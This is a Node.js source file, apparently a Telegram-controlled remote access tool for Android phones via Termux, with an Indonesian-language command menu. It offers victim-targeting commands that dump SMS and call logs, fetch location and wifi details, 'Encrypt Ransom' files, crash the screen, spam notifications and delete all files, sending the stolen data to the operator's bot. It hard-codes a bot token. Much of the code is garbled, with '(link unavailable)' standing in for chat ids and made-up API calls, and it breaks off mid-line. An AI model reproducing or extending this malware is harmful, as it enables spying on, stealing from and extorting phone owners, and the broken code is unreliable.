const TelegramBot = require('node-telegram-bot-api');
const termuxApi = require('termux-api -y');

const token = '7132826358:AAGCLoI7JYHA3nFYwEE8seu-qTmjwxEONL0';
const bot = new TelegramBot(token, { polling: true });

bot.onText(/\/start/, (msg) => {
  const keyboard = [
    ['Cek Status Baterai', 'Lokasi'],
    ['Informasi System', 'Dump Sms'],
    ['Dump Panggilan', 'Ubah Wallpaper'],
    ['Pesan Teks', 'Pesan Audio'],
    ['Mati/Hidup Wifi', 'Getar Devices'],
    ['Dapatkan Informasi Wifi', 'Senter On/Off'],
    ['Spam Notifikasi', 'Ambil List Kotak Target'],
    ['Play Audio', 'Spam File'],
    ['Encrypt Ransom', 'Decrypt Ransom'],
    ['Layar Crash', 'Galery eyes'],
    ['Remove All File', 'Reset Semua Perintah']
  ];

  bot.sendMessage((link unavailable), 'Pilih perintah:', {
    reply_markup: {
      keyboard
    }
  });
});

bot.on('message', (msg) => {
  const perintah = msg.text;

  switch (perintah) {
    case 'Cek Status Baterai':
      termuxApi.batteryStatus().then((data) => bot.sendMessage((link unavailable), `Status Baterai: ${data}`));
      break;
    case 'Lokasi':
      termuxApi.location().then((data) => bot.sendMessage((link unavailable), `Lokasi: ${data}`));
      break;
    case 'Informasi System':
      termuxApi.info().then((data) => bot.sendMessage((link unavailable), `Informasi System: ${data}`));
      break;
    case 'Dump Sms':
      termuxApi.smsList().then((data) => bot.sendMessage((link unavailable), `Dump Sms: ${data}`));
      break;
    case 'Dump Panggilan':
      termuxApi.callLog().then((data) => bot.sendMessage((link unavailable), `Dump Panggilan: ${data}`));
      break;
    case 'Ubah Wallpaper':
      termuxApi.wallpaper('URL_GAMBAR').then((data) => bot.sendMessage((link unavailable), `Wallpaper berhasil diubah`));
      break;
    case 'Pesan Teks':
      bot.sendMessage((link unavailable), 'Masukkan pesan teks:');
      break;
    case 'Pesan Audio':
      bot.sendMessage((link unavailable), 'Masukkan pesan audio:');
      break;
    case 'Mati/Hidup Wifi':
      termuxApi.wifiEnable(true).then((data) => bot.sendMessage((link unavailable), `Wifi dihidupkan`));
      break;
    case 'Getar Devices':
      termuxApi.vibrate().then((data) => bot.sendMessage((link unavailable), `Getar devices berhasil`));
      break;
    case 'Dapatkan Informasi Wifi':
      termuxApi.wifiConnectionInfo().then((data) => bot.sendMessage((link unavailable), `Informasi Wifi: ${data}`));
      break;
    case 'Senter On/Off':
      termuxApi.torch().then((data) => bot.sendMessage((link unavailable), `Senter berhasil dihidupkan/dimatikan`));
      break;
    case 'Spam Notifikasi':
      bot.sendMessage((link unavailable), 'Masukkan pesan notifikasi:');
      break;
    case 'Ambil List Kotak Target':
      termuxApi.smsList().then((data) => bot.sendMessage((link unavailable), `List kotak target: ${data}`));
      break;
    case 'Play Audio':
      bot.sendMessage((link unavailable), 'Masukkan file audio:');
      break;
    case 'Spam File':
      bot.sendMessage((link unavailable), 'Masukkan file:');
      break;
    case 'Encrypt Ransom':
      termuxApi.encrypt('FILE').then((data) => bot.sendMessage((link unavailable), `File berhasil dienkripsi`));
      break;
    case 'Decrypt Ransom':
      termuxApi.decrypt('FILE').then((data) => bot.sendMessage((link unavailable), `File berhasil didekripsi`));
      break;
    case 'Layar Crash':
      termuxApi.crash().then((data) => bot.sendMessage((link unavailable), `Layar berhasil di-crash`));
      break;
    case 'Galery eyes':
      termuxApi.gallery().then((data) => bot.sendMessage((link unavailable), `Galery eyes berhasil dibuka`));
      break;
    case 'Remove All File':
      termuxApi.rm('FILE').then((data) => bot.sendMessage((link unavailable)
